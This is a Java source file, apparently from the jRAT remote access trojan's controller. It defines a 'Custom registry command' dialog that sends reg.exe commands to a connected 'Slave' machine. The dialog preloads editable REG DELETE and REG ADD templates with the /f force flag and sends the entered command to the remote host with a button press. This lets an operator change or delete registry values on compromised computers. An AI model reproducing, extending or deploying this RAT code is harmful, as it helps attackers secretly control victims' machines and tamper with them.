package se.jrat.controller.ui.dialogs;

import iconlib.IconUtils;

import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.DefaultComboBoxModel;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.border.EmptyBorder;

import se.jrat.controller.Slave;
import se.jrat.controller.packets.outgoing.Packet80CustomRegQuery;


@SuppressWarnings({ "serial", "rawtypes", "unchecked" })
public class DialogCustomRegQuery extends BaseDialog {

	private JPanel contentPane;
	private JComboBox comboBox;

	public DialogCustomRegQuery(Slave sl) {
		super(sl);
		setResizable(false);
		setIconImage(Toolkit.getDefaultToolkit().getImage(DialogCustomRegQuery.class.getResource("/icons/key-arrow.png")));
		setTitle("Custom registry command");

		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 385, 119);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);

		comboBox = new JComboBox();
		comboBox.setModel(new DefaultComboBoxModel(new String[] { "REG DELETE %KEYPATH%\\\\ /v %VALUE% /f", "REG ADD %KEYPATH%\\\\ /v %VALUE% /t REG_SZ /d %DATA% /f" }));
		comboBox.setEditable(true);

		JButton btnExecuteRegexeCommand = new JButton("Execute reg.exe command");
		btnExecuteRegexeCommand.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				slave.addToSendQueue(new Packet80CustomRegQuery(comboBox.getSelectedItem().toString().trim()));
			}
		});
		btnExecuteRegexeCommand.setIcon(IconUtils.getIcon("key-arrow"));
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addContainerGap().addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addComponent(comboBox, 0, 349, Short.MAX_VALUE).addComponent(btnExecuteRegexeCommand, Alignment.TRAILING)).addContainerGap()));
		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addContainerGap().addComponent(comboBox, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED, 16, Short.MAX_VALUE).addComponent(btnExecuteRegexeCommand).addContainerGap()));
		contentPane.setLayout(gl_contentPane);
	}
}
